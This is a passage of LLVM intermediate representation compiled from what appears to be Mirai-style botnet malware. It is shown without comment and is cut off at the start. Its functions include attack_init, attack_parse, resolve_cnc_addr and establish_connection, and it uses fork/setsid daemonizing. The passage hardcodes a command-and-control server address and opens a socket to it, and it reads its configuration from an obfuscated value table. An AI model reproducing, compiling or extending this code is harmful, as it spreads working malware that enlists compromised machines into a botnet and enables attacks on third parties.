  br label %72

66:                                               ; preds = %25
  %67 = load i32, i32* @fd_ctrl, align 4
  %68 = call i32 @listen(i32 %67, i32 1) #5
  %69 = icmp eq i32 %68, -1
  br i1 %69, label %70, label %71

70:                                               ; preds = %66
  br label %71

71:                                               ; preds = %70, %66
  br label %72

72:                                               ; preds = %7, %71, %62
  ret void
}

declare void @rand_init() #0

declare void @util_zero(i8*, i32) #0

declare i32 @util_strlen(i8*) #0

declare i32 @util_strcpy(i8*, i8*) #0

declare i32 @rand_next() #0

declare void @rand_alpha_str(i8*, i32) #0

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) #2

declare void @table_unlock_val(i8 zeroext) #0

declare i8* @table_retrieve_val(i32, i32*) #0

declare i64 @write(i32, i8*, i64) #0

declare void @table_lock_val(i8 zeroext) #0

; Function Attrs: nounwind
declare i32 @fork() #2

; Function Attrs: nounwind
declare i32 @setsid() #2

declare i32 @close(i32) #0

declare signext i8 @attack_init() #0

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @establish_connection() #1 {
  %1 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %2 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %2, i32* @fd_serv, align 4
  %3 = icmp eq i32 %2, -1
  br i1 %3, label %4, label %5

4:                                                ; preds = %0
  br label %21

5:                                                ; preds = %0
  %6 = load i32, i32* @fd_serv, align 4
  %7 = load i32, i32* @fd_serv, align 4
  %8 = call i32 (i32, i32, ...) @fcntl(i32 %7, i32 3, i32 0)
  %9 = or i32 2048, %8
  %10 = call i32 (i32, i32, ...) @fcntl(i32 %6, i32 4, i32 %9)
  %11 = load void ()*, void ()** @resolve_func, align 8
  %12 = icmp ne void ()* %11, null
  br i1 %12, label %13, label %15

13:                                               ; preds = %5
  %14 = load void ()*, void ()** @resolve_func, align 8
  call void %14()
  br label %15

15:                                               ; preds = %13, %5
  store i8 1, i8* @pending_connection, align 1
  %16 = load i32, i32* @fd_serv, align 4
  %17 = bitcast %union.__CONST_SOCKADDR_ARG* %1 to %struct.sockaddr**
  store %struct.sockaddr* bitcast (%struct.sockaddr_in* @srv_addr to %struct.sockaddr*), %struct.sockaddr** %17, align 8
  %18 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %1, i32 0, i32 0
  %19 = load %struct.sockaddr*, %struct.sockaddr** %18, align 8
  %20 = call i32 @connect(i32 %16, %struct.sockaddr* %19, i32 16)
  br label %21

21:                                               ; preds = %15, %4
  ret void
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #0

declare i64 @send(i32, i8*, i64, i32) #0

declare i32 @accept(i32, %struct.sockaddr*, i32*) #0

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #2

; Function Attrs: noreturn nounwind
declare void @exit(i32) #4

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @teardown_connection() #1 {
  %1 = load i32, i32* @fd_serv, align 4
  %2 = icmp ne i32 %1, -1
  br i1 %2, label %3, label %6

3:                                                ; preds = %0
  %4 = load i32, i32* @fd_serv, align 4
  %5 = call i32 @close(i32 %4)
  br label %6

6:                                                ; preds = %3, %0
  store i32 -1, i32* @fd_serv, align 4
  %7 = call i32 @sleep(i32 1)
  ret void
}

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #2

declare i32 @sleep(i32) #0

; Function Attrs: nounwind readnone willreturn
declare i32* @__errno_location() #3

declare i64 @recv(i32, i8*, i64, i32) #0

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @ntohs(i16 zeroext) #3

declare void @attack_parse(i8*, i32) #0

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal void @resolve_cnc_addr() #1 {
  call void @table_unlock_val(i8 zeroext 1)
  %1 = call i32 @htonl(i32 520568322) #6
  store i32 %1, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 2, i32 0), align 4
  %2 = call i8* @table_retrieve_val(i32 1, i32* null)
  %3 = bitcast i8* %2 to i16*
  %4 = load i16, i16* %3, align 2
  store i16 %4, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i32 0, i32 1), align 2
  call void @table_lock_val(i8 zeroext 1)
  ret void
}

; Function Attrs: nounwind readnone willreturn
declare i32 @htonl(i32) #3

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #2

declare i32 @fcntl(i32, i32, ...) #0

declare i32 @connect(i32, %struct.sockaddr*, i32) #0

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #2

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #2

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #2

attributes #0 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { noinline nounwind optnone sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone willreturn }
attributes #7 = { noreturn nounwind }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"clang version 13.0.1"}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
